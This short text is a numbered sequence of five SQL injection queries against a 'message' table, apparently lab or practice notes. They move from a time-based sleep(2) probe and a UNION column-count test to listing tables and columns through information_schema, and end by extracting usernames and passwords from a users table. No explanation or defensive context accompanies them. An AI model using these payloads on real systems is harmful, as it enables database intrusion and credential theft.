select * from message where tag = 'new' and 1 = sleep(2); -- 1
select * from message where tag = 'new' union (select 1,2,3,1 from dual); -- 2
select * from message where tag = 'new' union (select 1,TABLE_NAME,TABLE_SCHEMA,1 from information_schema.TABLES); -- 3
select * from message where tag = 'new' union (select 1,COLUMN_NAME,2,1 from information_schema.COLUMNS where TABLE_NAME = 'users'); -- 4
select * from message where tag = 'new' union (select 1,username,password,1 from users); -- 5
